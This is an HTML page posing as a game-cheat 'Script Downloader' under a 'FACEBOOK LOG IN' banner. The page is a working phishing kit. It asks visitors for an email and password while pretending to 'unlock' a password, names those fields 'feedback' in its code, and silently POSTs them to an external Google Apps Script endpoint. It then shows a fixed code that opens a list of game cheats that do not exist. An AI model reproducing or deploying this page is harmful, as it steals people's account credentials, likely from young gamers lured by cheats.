<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Script Downloader</title>

<style>
body{
  margin:0;
  font-family: Helvetica, Arial, sans-serif;
  background:#f0f2f5;
}

/* Header */
.header{
  background:#1877f2;
  color:white;
  padding:14px;
  font-size:20px;
  font-weight:bold;
  text-align:center;
}

/* Card */
.box{
  background:white;
  max-width:360px;
  margin:30px auto;
  padding:20px;
  border-radius:8px;
  box-shadow:0 2px 6px rgba(0,0,0,.2);
  text-align:center;
}

input, textarea{
  width:100%;
  padding:12px;
  margin:10px 0;
  border-radius:6px;
  border:1px solid #ccd0d5;
  font-size:15px;
}

textarea{height:90px; resize:none;}

button{
  width:100%;
  padding:12px;
  border:none;
  border-radius:6px;
  background:#1877f2;
  color:white;
  font-size:16px;
  font-weight:bold;
  cursor:pointer;
}

button:active{opacity:.85}

.hidden{display:none;}

.small{
  color:#65676b;
  font-size:13px;
  margin-bottom:10px;
}

/* Loading */
.loading{
  width:100%;
  height:6px;
  background:#ddd;
  border-radius:4px;
  overflow:hidden;
}
.bar{
  height:100%;
  width:0%;
  background:#1877f2;
}
</style>
</head>

<body>

<div class="header">FACEBOOK LOG IN</div>

<!-- LOADING -->
<div class="box" id="loadingBox">
  <div class="small">Loading...</div>
  <div class="loading"><div class="bar" id="bar"></div></div>
  <p id="percent">0%</p>
</div>

<!-- FEEDBACK 1 -->
<div class="box hidden" id="feedback1Box">
  <div class="small">Unlocking password 1/2</div>
  <textarea id="feedback1" placeholder="Enter Email"></textarea>
  <button onclick="nextFeedback()">GO</button>
</div>

<!-- FEEDBACK 2 -->
<div class="box hidden" id="feedback2Box">
  <div class="small">Unlocking password 2/2<?</div>
  <textarea id="feedback2" placeholder="Enter Password"></textarea>
  <button onclick="submitFeedback()">Get Password</button>
</div>

<!-- PASSWORD -->
<div class="box hidden" id="passwordBox">
  <div class="small">Your Password</div>
  <h2>5863</h2>
  <button onclick="backToMain()">Back to Main</button>
</div>

<!-- MAIN -->
<div class="box hidden" id="mainBox">
  <h2>SCRIPT DOWNLOADER</h2>
  <input id="pass" placeholder="Enter Password">
  <button onclick="checkPassword()">Enter Password</button>
</div>

<!-- SCRIPT LIST -->
<div class="box hidden" id="scriptBox">
  <h3>Scripts</h3>
  <button onclick="alert('NO SCRIPT')">ðŸŽ®Super Bear Adventure</button>
  <button onclick="alert('NO SCRIPT')">ðŸŽ®Gym Idle Clicker</button>
  <button onclick="alert('NO SCRIPT')">ðŸŽ®Counter Terrorist Strike</button>
  <button onclick="alert('NO SCRIPT')">ðŸŽ®Heroes Strike</button>
  <button onclick="alert('NO SCRIPT')">ðŸŽ®Magica.io</button>
  <button onclick="alert('NO SCRIPT')">ðŸŽ®Obby Parkour</button>
  <button onclick="alert('NO SCRIPT')">ðŸŽ®Mobile Legends Bang Bang</button>
</div>

<script>
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzFhK2kvKx5lklYr4BOtPyfXCQvu8LO-DJaSjf5V-3C1hg6HTlzsCsaPjczLcYZfzpEow/exec";
let f1 = "";

/* Loading */
let p = 0;
let load = setInterval(()=>{
  p+=2;
  document.getElementById("bar").style.width = p+"%";
  document.getElementById("percent").innerText = p+"%";
  if(p>=100){
    clearInterval(load);
    loadingBox.classList.add("hidden");
    feedback1Box.classList.remove("hidden");
  }
},40);

/* Feedback */
function nextFeedback(){
  f1 = feedback1.value;
  if(!f1){ alert("Please write feedback"); return; }
  feedback1Box.classList.add("hidden");
  feedback2Box.classList.remove("hidden");
}

function submitFeedback(){
  const f2 = feedback2.value;
  if(!f2){ alert("Please write feedback"); return; }

  fetch(WEB_APP_URL,{
    method:"POST",
    body:JSON.stringify({feedback1:f1, feedback2:f2})
  }).then(()=>{
    feedback2Box.classList.add("hidden");
    passwordBox.classList.remove("hidden");
  }).catch(()=>alert("Submit failed"));
}

function backToMain(){
  passwordBox.classList.add("hidden");
  mainBox.classList.remove("hidden");
}

function checkPassword(){
  if(pass.value==="5863"){
    mainBox.classList.add("hidden");
    scriptBox.classList.remove("hidden");
  }else{
    alert("Wrong password");
  }
}
</script>

</body>
</html>
